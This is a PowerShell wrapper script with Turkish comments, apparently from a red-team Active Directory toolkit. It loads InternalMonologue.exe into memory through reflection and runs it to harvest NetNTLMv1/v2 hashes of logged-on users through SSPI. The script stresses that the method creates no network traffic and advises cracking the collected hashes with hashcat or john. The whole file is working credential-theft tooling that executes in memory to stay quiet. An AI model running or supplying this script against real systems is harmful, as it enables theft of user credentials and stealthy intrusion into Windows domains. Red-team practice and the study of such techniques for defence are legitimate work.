<#
.SYNOPSIS
    InternalMonologue.exe'yi PowerShell üzerinden in-memory çalıştırır.

.DESCRIPTION
    InternalMonologue, network trafiği oluşturmadan local olarak
    NetNTLMv1/v2 hash'leri toplayan bir araçtır. SSPI API'sini
    kullanarak mevcut oturumdaki kullanıcıların hash'lerini çeker.

    Bu, network tabanlı MITM saldırılarına (Responder vb.) kıyasla
    çok daha sessiz bir yöntemdir.

.PARAMETER Command
    InternalMonologue'a geçirilecek komut string'i.

.PARAMETER ExePath
    InternalMonologue.exe dosyasının yolu.

.EXAMPLE
    # Varsayılan ayarlarla çalıştır
    Invoke-InternalMonologue

.EXAMPLE
    # Verbose çıktı ile
    Invoke-InternalMonologue -Command "-Verbose"

.EXAMPLE
    # Farklı exe yolu
    Invoke-InternalMonologue -ExePath "C:\tools\InternalMonologue.exe"

.NOTES
    Orijinal Araç: InternalMonologue by Elad Shamir (@elaboratesalmon)
    Wrapper: AD Red Team PowerShell Toolkit
    Avantajı: Network trafiği oluşturmaz, SSPI üzerinden local çalışır.
#>

function Invoke-InternalMonologue {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$Command = "",

        [Parameter(Mandatory = $false)]
        [string]$ExePath
    )

    if (-not $ExePath) {
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $ExePath = Join-Path (Split-Path -Parent $scriptDir) "InternalMonologue.exe"
    }

    if (-not (Test-Path $ExePath)) {
        Write-Error "[!] InternalMonologue.exe bulunamadı: $ExePath"
        return
    }

    Write-Host "[*] InternalMonologue.exe yükleniyor: $ExePath" -ForegroundColor Cyan
    Write-Host "[*] NetNTLM hash toplama başlatılıyor (network trafiği oluşturmaz)..." -ForegroundColor Yellow

    try {
        $bytes = [System.IO.File]::ReadAllBytes($ExePath)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Write-Host "[+] Assembly belleğe yüklendi." -ForegroundColor Green

        $args = if ($Command) { $Command.Split(' ', [StringSplitOptions]::RemoveEmptyEntries) } else { @() }
        Write-Host ("-" * 60) -ForegroundColor DarkGray

        $originalOut = [Console]::Out
        $stringWriter = New-Object System.IO.StringWriter
        [Console]::SetOut($stringWriter)

        try {
            $assembly.EntryPoint.Invoke($null, @(,[string[]]$args))
        }
        catch [System.Reflection.TargetInvocationException] {
            if ($_.Exception.InnerException) {
                Write-Warning "InternalMonologue exception: $($_.Exception.InnerException.Message)"
            }
        }
        finally {
            [Console]::SetOut($originalOut)
        }

        $output = $stringWriter.ToString()
        if ($output) {
            Write-Host $output
            Write-Host ("-" * 60) -ForegroundColor DarkGray
            Write-Host "[+] Toplanan hash'leri hashcat veya john ile kırabilirsiniz." -ForegroundColor Green
        }
        else {
            Write-Host ("-" * 60) -ForegroundColor DarkGray
            Write-Host "[*] Çıktı alınamadı. Admin yetkisi gerekebilir." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Error "[!] Hata: $($_.Exception.Message)"
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    Invoke-InternalMonologue -Command ($args -join ' ')
}
